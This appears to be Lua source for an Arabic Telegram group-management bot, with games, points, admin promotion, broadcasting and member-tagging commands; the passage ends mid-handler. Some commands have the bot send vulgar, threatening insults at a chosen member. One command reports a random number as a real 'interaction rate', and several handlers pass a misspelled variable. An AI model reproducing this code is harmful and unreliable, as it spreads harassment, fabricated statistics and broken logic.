if text == 'الالعاب' and ChCheck(msg) or text == 'العاب' and ChCheck(msg) or text == 'اللعبه' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1,[[
♰ ⌯ قائمة العاب المجموعه ↫ ⤈
⍆═════BR═════⍅
♰ ⌯ لعبة التخمين ↫ خمن
♰ ⌯ لعبة الامثله ↫ امثله
♰ ⌯ لعبة العكس ↫ العكس
♰ ⌯ لعبة الاسئله ↫ اسئله
♰ ⌯ لعبة الروليت ↫ روليت
♰ ⌯ لعبة الحزوره ↫ حزوره
♰ ⌯ لعبة الترتيب ↫ ترتيب
♰ ⌯ لعبة المعاني ↫ معاني
♰ ⌯ لعبة المختلف ↫ المختلف
♰ ⌯ لعبة السمايلات ↫ سمايلات
♰ ⌯ لعبة المحيبس ↫ المحيبس
♰ ⌯ لعبة الرياضيات ↫ رياضيات
♰ ⌯ لعبة الانكليزيه ↫ انكليزيه
⍆═════BR═════⍅
♰ ⌯ نقاطي • بيع نقاطي
⍆═════BR═════⍅
♰ ⌯ [SoUrCe ChANnEl](https://t.me/CXRCX)
]], 1, 'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عذرا الالعاب معطله في المجموعه', 1, 'md')
end
end
--     SoUrCe BrAnD     --
if text == 'بيع نقاطي' and ChCheck(msg) then
if tonumber((DevBrAnD:get(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ لم تربح اي نقطه\n♰ ⌯ ارسل ↫ الالعاب للعب', 1, 'md')
else
DevBrAnD0 = (DevBrAnD:get(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevBrAnD:incrby(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevBrAnD0)
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ تم بيع '..(DevBrAnD:get(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n♰ ⌯ كل نقطه تساوي 50 رساله', 'md')
DevBrAnD:del(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     SoUrCe BrAnD     --
if text == 'رفع المشرفين' and ChCheck(msg) or text == 'رفع الادمنيه' and ChCheck(msg) then  
tdcli_function ({ID = "GetChANnElMembers",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChANnElMembersAdministrators"},offset_ = 0,limit_ = 200},function(arg,abbas) 
DevBrAnD:del(BrAnD..'BrAnD:BrAnDConstructor:'..msg.chat_id_)
local num = 0
local admins = abbas.members_  
for i=0 , #admins do   
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevBrAnD:sadd(BrAnD..'BrAnD:Admins:'..msg.chat_id_, admins[i].user_id_)   
num = num + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
if dp.first_name_ == false then
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, admins[i].user_id_)   
end
end,nil)   
else
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, admins[i].user_id_)   
end 
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
DevBrAnD:sadd(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevBrAnD:sadd(BrAnD..'BrAnD:BrAnDConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ لا يوجد ادمنيه ليتم رفعهم\n♰ ⌯ تم رفع منشئ المجموعه", 1, 'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم رفع '..num..' من الادمنيه \n♰ ⌯ تم رفع منشئ المجموعه', 1, 'md')
end
end,nil) 
end
--     SoUrCe BrAnD     --
if text == 'غادر' and SudoBot(msg) then
if DevBrAnD:get(BrAnD.."BrAnD:Left:Bot"..BrAnD) and not Sudo(msg) then
Dev_BrAnD(msg.chat_id_,msg.id_, 1, "♰ ⌯ المغادره معطله من قبل المطور الاساسي", 1, 'md')
return false  
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم مغادرة المجموعه \n♰ ⌯ تم حذف جميع بياناتها ', 1, 'md')
ChatLeave(msg.chat_id_, BrAnD)
DevBrAnD:srem(BrAnD.."BrAnD:Groups",msg.chat_id_)
end
--     SoUrCe BrAnD     --
if text ==('موقعي') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'عضو'
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ موقعك ↫ '..rtpa, 1, 'md')
end,nil)
end
--     SoUrCe BrAnD     --
if text:match("^معلوماتي$") and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(DevBrAnD:get(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevBrAnD:get(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevBrAnD:get(BrAnD..'BrAnD:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevBrAnD:get(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ اسمك ↫ ❨ ['..result.first_name_..'] ❩\n♰ ⌯ معرفك ↫ ❨ ['..username..'] ❩\n♰ ⌯ ايديك ↫ ❨ `'..result.id_..'` ❩\n♰ ⌯ نقاطك ↫ ❨ '..user_nkt..' ❩\n♰ ⌯ رسائلك ↫ ❨ '..user_msgs..' ❩\n♰ ⌯ جهاتك ↫ ❨ '..cont..' ❩\n♰ ⌯ تفاعلك ↫ '..formsgs(msguser)..'\n♰ ⌯ رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
end
getUser(msg.sender_user_id_,get_me)
end
end
--     SoUrCe BrAnD     --
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" or text == "وضع قناة الاشتراك" then
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط ', 1, 'md')
else
DevBrAnD:setex(BrAnD..'DevBrAnD4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_, '♰ ⌯ ارسل لي معرف قناة الاشتراك الان')
end
return false  
end
if text == "تفعيل الاشتراك الاجباري" then  
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط ', 1, 'md')
else
if DevBrAnD:get(BrAnD..'DevBrAnD2') then
local DevCh = DevBrAnD:get(BrAnD..'DevBrAnD3')
send(msg.chat_id_, msg.id_,"♰ ⌯ الاشتراك الاجباري مفعل \n♰ ⌯ على القناة ↫ ["..DevCh.."]")
else
DevBrAnD:setex(BrAnD..'DevBrAnD4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_,"♰ ⌯ لاتوجد قناة لتفعيل الاشتراك\n♰ ⌯ ارسل لي معرف قناة الاشتراك الان")
end
end
return false  
end
if text == "تعطيل الاشتراك الاجباري" then  
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط ', 1, 'md')
else
DevBrAnD:del(BrAnD..'DevBrAnD2') DevBrAnD:del(BrAnD..'DevBrAnD3')
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل الاشتراك الاجباري'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
end
return false  
end
if text == "حذف قناة الاشتراك" or text == "حذف قناه الاشتراك" then
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط ', 1, 'md')
else
DevBrAnD:del(BrAnD..'DevBrAnD2') DevBrAnD:del(BrAnD..'DevBrAnD3')
Dev_BrAnD(msg.chat_id_, msg.id_, 1,"♰ ⌯ تم حذف قناة الاشتراك الاجباري", 1, 'md') 
end
end
if Sudo(msg) then
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' then
if DevBrAnD:get(BrAnD..'DevBrAnD3') then
local DevCh = DevBrAnD:get(BrAnD..'DevBrAnD3')
send(msg.chat_id_, msg.id_, "♰ ⌯ قناة الاشتراك ↫ ["..DevCh.."]")
else
send(msg.chat_id_, msg.id_, "♰ ⌯ لاتوجد قناة في الاشتراك الاجباري")
end
return false  
end end
--     SoUrCe BrAnD     --
if SudoBot(msg) then
if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function BrAnDTEAM(extra,result,success)
if DevBrAnD:get(BrAnD.."BrAnD:Send:Bot"..BrAnD) and not Sudo(msg) then 
send(msg.chat_id_, msg.id_,"♰ ⌯ الاذاعه معطله من قبل المطور الاساسي")
return false
end
local listgp = DevBrAnD:smembers(BrAnD.."BrAnD:Groups")
for k,v in pairs(listgp) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local listpv = DevBrAnD:smembers(BrAnD.."BrAnD:Users")
for k,v in pairs(listpv) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم اذاعة رسالتك بالتوجيه \n♰ ⌯ ‏في ↫ ❨ '..#listgp..' ❩ مجموعه \n♰ ⌯ والى ↫ ❨ '..#listpv..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BrAnDTEAM)
end
end
--     SoUrCe BrAnD     --
if text:match("^مشاهده المنشور$") and ChCheck(msg) or text:match("^مشاهدات المنشور$") and ChCheck(msg) or text:match("^عدد المشاهدات$") and ChCheck(msg) then
DevBrAnD:set(BrAnD..'BrAnD:viewget'..msg.sender_user_id_,true)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ حسنا قم باعادة توجيه للمنشور الذي تريدني حساب مشاهداته', 1, 'md')
end
--     SoUrCe BrAnD     --
if text:match("^السورس$") or text:match("^سورس$") then 
local text =  [[
Welcome To SoUrCe
♰ ⌯ BrAnD TEAM
⍆═════BR═════⍅
♰ ⌯ [SoUrCe ChANnEl](https://t.me/CXRCX)

♰ ⌯ [Exp SoUrCe](https://t.me/GXKXG)

♰ ⌯ [Developer](https://t.me/s_x_X_G)
⍆═════BR═════⍅
♰ ⌯ [Tws BrAnD](https://t.me/CXTCXBOT)
]]
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     SoUrCe BrAnD     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "اطردني" and ChCheck(msg) or text == "ادفرني" and ChCheck(msg) then
if DevBrAnD:get(BrAnD.."BrAnD:Kick:Me"..msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevBrAnD:set(BrAnD..'yes'..msg.sender_user_id_..'', 'delyes')
DevBrAnD:set(BrAnD..'no'..msg.sender_user_id_..'', 'delno')
local Text = '♰ ⌯ هل انت متأكد من المغادره'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/delyes"},{text="لا",callback_data="/delno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     SoUrCe BrAnD     --
if text == 'تعطيل اطردني' and Manager(msg) and ChCheck(msg) then
DevBrAnD:set(BrAnD.."BrAnD:Kick:Me"..msg.chat_id_, true)
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل امر اطردني'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevBrAnD:del(BrAnD.."BrAnD:Kick:Me"..msg.chat_id_)
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل امر اطردني'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
end
--     SoUrCe BrAnD     --
if text == "نزلني" and ChCheck(msg) then
if DevBrAnD:get(BrAnD.."BrAnD:Del:Me"..msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevBrAnD:set(BrAnD..'yesdel'..msg.sender_user_id_..'', 'delyes')
DevBrAnD:set(BrAnD..'nodel'..msg.sender_user_id_..'', 'delno')
local Text = '♰ ⌯ هل انت متأكد من تنزيلك'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/yesdel"},{text="لا",callback_data="/nodel"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     SoUrCe BrAnD     --
if text == 'تعطيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevBrAnD:set(BrAnD.."BrAnD:Del:Me"..msg.chat_id_, true)
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل امر نزلني'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevBrAnD:del(BrAnD.."BrAnD:Del:Me"..msg.chat_id_)
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل امر نزلني'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
end
--     SoUrCe BrAnD     --
if Admin(msg) then
if text and text == "تاك للكل" and ChCheck(msg) then
function TagAll(dp1,dp2)
local text = "♰ ⌯ وينكم يالربع \n⍆═════BR═════⍅\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevBrAnD:get(BrAnD..'Save:UserName'..v.user_id_) then
text = text..""..i.."~ : [@"..DevBrAnD:get(BrAnD..'Save:UserName'..v.user_id_).."]\n"
else
text = text..""..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChANnElMembers",ChANnEl_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
--     SoUrCe BrAnD     --
if text:match("^كللهم (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كللهم) (.*)$")}
function TagAll(dp1,dp2)
local text = "♰ ⌯ "..txt[2].." \n⍆═════BR═════⍅\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevBrAnD:get(BrAnD..'Save:UserName'..v.user_id_) then
text = text..""..i.."~ : [@"..DevBrAnD:get(BrAnD..'Save:UserName'..v.user_id_).."]\n"
else
text = text..""..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChANnElMembers",ChANnEl_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
--     SoUrCe BrAnD     --
if text:match("^رسائلي$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = DevBrAnD:get(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ عدد رسائلك هنا ↫ *❨ "..user_msgs.." ❩*", 1, 'md')
end
if text == "التفاعل" and ChCheck(msg) then
local EntryNumber = (DevBrAnD:get(BrAnD..'BrAnD:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevBrAnD:get(BrAnD..'BrAnD:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevBrAnD:get(BrAnD..'BrAnD:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ انضمام الاعضاء اليوم ↫ *"..EntryNumber.."*\n♰ ⌯ مغادرة الاعضاء اليوم ↫ *"..ExitNumber.."*\n♰ ⌯ عدد الرسائل اليوم ↫ *"..MsgNumberDay.."*\n♰ ⌯ نسبة التفاعل اليوم ↫ *"..math.random(40,100).."%*", 1, 'md')
end
--     SoUrCe BrAnD     --
if text:match("^معرفي$") and ChCheck(msg) then
function get_username(extra,result,success)
text = '♰ ⌯ معرفك ↫ ❨ User ❩'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
if text:match("^اسمي$") and ChCheck(msg) then
function get_firstname(extra,result,success)
text = '♰ ⌯ اسمك ↫ firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
--     SoUrCe BrAnD     --
if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" then  Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ @HMSEBOT', 1, 'md') end
if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'♰ ⌯ اضغط للحصول على الرابط',nil,inline) return false end
if text:match("^بوت الحذف$") or text:match("^اريد بوت الحذف$") or text:match("^اريد بوت حذف$") or text:match("^بوت حذف$") or text:match("^بوت حذف حسابات$") or text:match("^راح احذف$") then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'♰ ⌯ اضغط للحصول على البوت',nil,inline) return false end
if text:match("^جهاتي$") and ChCheck(msg) or text:match("^اضافاتي$") and ChCheck(msg) then add = (tonumber(DevBrAnD:get(BrAnD..'BrAnD:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text:match("^تعديلاتي$") or text:match("^سحكاتي$") and ChCheck(msg) then local edit_msg = DevBrAnD:get(BrAnD..'BrAnD:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
if text:match("^ايديي$") and ChCheck(msg) then Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ ايديك ↫ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
if text:match("^رتبتي$") and ChCheck(msg) then Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
if text:match("^ايدي المجموعه$") and ChCheck(msg) then Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ايدي المجموعه ↫ `"..msg.chat_id_.."`", 1, 'md') end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevBrAnD:del(BrAnD..'BrAnD:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevBrAnD:del(BrAnD..'BrAnD:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     SoUrCe BrAnD     --
if text == "المطور" then 
local DevCh1 = DevBrAnD:get(BrAnD.."DevBrAnD3")
local DevText = DevBrAnD:get(BrAnD.."DevText")
if DevCh1 then DevCh = '\n♰ ⌯ *Dev Ch* ↬ ['..DevCh1..']' else DevCh = '' end
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
if dp.username_ ~= false then DevUser = '@'..dp.username_ else DevUser = dp.first_name_ end
if DevText then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, DevText, 1, "md")
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *Dev User* ↬ ['..DevUser..']\n♰ ⌯ *Dev Id* ↬ '..DevId..''..DevCh, 1, "md")
end
end,nil)
end 
--     SoUrCe BrAnD     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') then 
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function BrAnDTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(BrAnD) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(218385683) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if DevBrAnD:sismember(BrAnD.."BrAnD:BrAnDConstructor:"..msg.chat_id_,result.id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local BrAnDTeAM= "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md') 
local BrAnDTeAM= { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_BrAnD(msg.chat_id_, result.id_, 1,''..BrAnDTEAM[math.random(#BrAnDTEAM)]..'', 1, 'html') 
else  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,BrAnDTEAM)
end
end
--     SoUrCe BrAnD     --
if text:match("^هينه$") or text:match("^بعد هينه$") or text:match("^هينه بعد$") or text:match("^لك هينه$") or text:match("^هينها$") or text:match("^هينهه$") or text:match("^رزله$") or text:match("^رزلهه$") or text:match("^رزلها$") then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Stupid'..msg.chat_id_) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(BrAnD) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(218385683) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if DevBrAnD:sismember(BrAnD.."BrAnD:BrAnDConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local BrAnDTeAM= "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md') 
local BrAnDTeAM= {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_BrAnD(msg.chat_id_, result.id_, 1,''..BrAnDTEAM[math.random(#BrAnDTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
end
if text:match("^بوسه$") or text:match("^بعد بوسه$") or text:match("^ضل بوس$") or text:match("^بوسه بعد$") or text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") or text:match("^بوسها بعد$") or text:match("^بوسهه$") then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Stupid'..msg.chat_id_) then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(BrAnD) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_BrAnD(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗', 1, 'html')
return false
end 
local BrAnDTeAM= "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md') 
local BrAnDTeAM= {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_BrAnD(msg.chat_id_, result.id_, 1,''..BrAnDTEAM[math.random(#BrAnDTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
end
if text:match("^صيحه$") or text:match("^صيحها$") or text:match("^صيحهه$") or text:match("^صيح$") then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Stupid'..msg.chat_id_) then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(BrAnD) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_BrAnD(msg.chat_id_, result.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️', 1, 'html')
return false
end 
local BrAnDTeAM= "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md') 
